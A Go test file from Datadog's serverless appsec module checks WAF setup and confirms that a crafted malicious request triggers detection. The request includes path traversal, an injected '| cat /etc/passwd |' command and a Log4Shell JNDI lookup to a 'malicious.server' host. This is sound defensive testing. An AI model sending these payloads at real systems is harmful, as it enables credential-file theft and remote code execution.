// Unless explicitly stated otherwise all files in this repository are licensed
// under the Apache License Version 2.0.
// This product includes software developed at Datadog (https://www.datadoghq.com/).
// Copyright 2016-present Datadog, Inc.

package appsec

import (
	"fmt"
	"strconv"
	"testing"

	waf "github.com/DataDog/go-libddwaf"

	"github.com/stretchr/testify/require"
)

func TestNew(t *testing.T) {
	for _, appsecEnabled := range []bool{true, false} {
		appsecEnabledStr := strconv.FormatBool(appsecEnabled)
		t.Run(fmt.Sprintf("DD_SERVERLESS_APPSEC_ENABLED=%s", appsecEnabledStr), func(t *testing.T) {
			t.Setenv("DD_SERVERLESS_APPSEC_ENABLED", appsecEnabledStr)
			lp, err := New()
			if err := wafHealth(); err != nil {
				if ok, _ := waf.SupportsTarget(); ok {
					// host should be supported by appsec, error is unexpected
					require.NoError(t, err)
				} else {
					// host not supported by appsec
					require.Error(t, err)
				}
				return
			}

			require.NoError(t, err)
			if appsecEnabled {
				require.NotNil(t, lp)
			} else {
				require.Nil(t, lp)
			}
		})
	}
}

func TestMonitor(t *testing.T) {
	if err := wafHealth(); err != nil {
		t.Skip("host not supported by appsec", err)
	}

	t.Setenv("DD_SERVERLESS_APPSEC_ENABLED", "true")
	t.Setenv("DD_APPSEC_WAF_TIMEOUT", "2s")
	asm, err := newAppSec()
	require.NoError(t, err)
	require.Nil(t, err)

	uri := "/path/to/resource/../../../../../database.yml.sqlite3"
	addresses := map[string]interface{}{
		"server.request.uri.raw": uri,
		"server.request.headers.no_cookies": map[string][]string{
			"user-agent": {"sql power injector"},
		},
		"server.request.query": map[string][]string{
			"query": {"$http_server_vars"},
		},
		"server.request.path_params": map[string]string{
			"proxy": "/path/to/resource | cat /etc/passwd |",
		},
		"server.request.body": "eyJ0ZXN0I${jndi:ldap://16.0.2.staging.malicious.server/a}joiYm9keSJ9",
	}
	events := asm.Monitor(addresses)
	require.NotNil(t, events)
}
